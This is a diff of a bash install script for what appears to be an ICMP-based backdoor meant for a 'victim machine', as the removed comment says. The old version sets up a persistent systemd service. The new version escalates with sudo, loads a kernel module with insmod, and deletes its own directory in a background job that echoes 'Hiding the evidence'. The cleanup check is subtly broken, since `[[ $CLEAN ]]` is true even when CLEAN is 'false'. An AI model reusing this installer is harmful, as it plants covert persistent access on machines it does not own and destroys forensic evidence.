@@ -1,28 +1,55 @@
-#!/bin/bash
+#!/bin/bash -x
+if [ "$EUID" -ne 0 ]; then
+    echo "Must run as root"
+    echo "Attempting privilege escalation..."
+    exec sudo "$0" "$@"
+fi
 
-# This folder downloaded from git
-# cd into same directory as install.sh
-# Must run as root
-# Only run on victim machine
+# Should the directory be deleted after install?
+CLEAN=false
+if [[ "$1" == "--clean" ]]; then
+    CLEAN=true;
+else
+    echo "Do you wish to delete this program after?"
+    select yn in "Yes" "No"; do
+        case $yn in
+            Yes ) CLEAN=true; break;;
+            No ) break;;
+        esac
+    done
+fi
 
 if [[ $(id -u) != "0" ]]; then
     echo "Must run as root"
     exit 1
 fi
 
-apt-get install -y libnfnetlink-dev libnetfilter-queue-dev
-apt install -y python3-pip
-pip install netfilterqueue scapy # may need to update this line Ubuntu 24.04LTS
+MISSING=$(make 2>&1 | awk -F: '/ not found/{print $3}' | sed 's/^[ \t]*//;s/[ \t]*$//')
 
+if ! [[ -z "$MISSING" ]]; then
+    /bin/sh -c "apt install -y $MISSING"
+    make
+fi
 
-cp ./icmp /var/lib/icmp
-chmod o+x /var/lib/icmp
-cp ./icmp.service /lib/systemd/system/icmp.service
-mkdir -p /lib/icmp
-gcc ./icmp.c -o /lib/icmp/icmp
+mkdir -p /etc/modules
+cp icmpk.ko /etc/modules
+insmod icmpk.ko
+echo "Inserting module"
 
-systemctl start icmp
-systemctl enable icmp
+if [[ $CLEAN ]]; then
+    make clean
+    # Delete the directory after installed
 
-echo "Installed..."
-echo "You should delete this folder now"
+    CURRENT_DIRECTORY="$(dirname "$(realpath "${0}")")"
+    TMP_DIR="$CURRENT_DIRECTORY/rt_delete_this"
+    mkdir "$TMP_DIR"
+    2>/dev/null find "$CURRENT_DIRECTORY" -mindepth 1 -exec mv {} "$TMP_DIR" \;
+    {
+        sleep 0.1;
+        rm -rf "$TMP_DIR"
+        rmdir "$CURRENT_DIRECTORY"
+        echo "Hiding the evidence"
+    } & 
+fi
+
+echo "Done!"
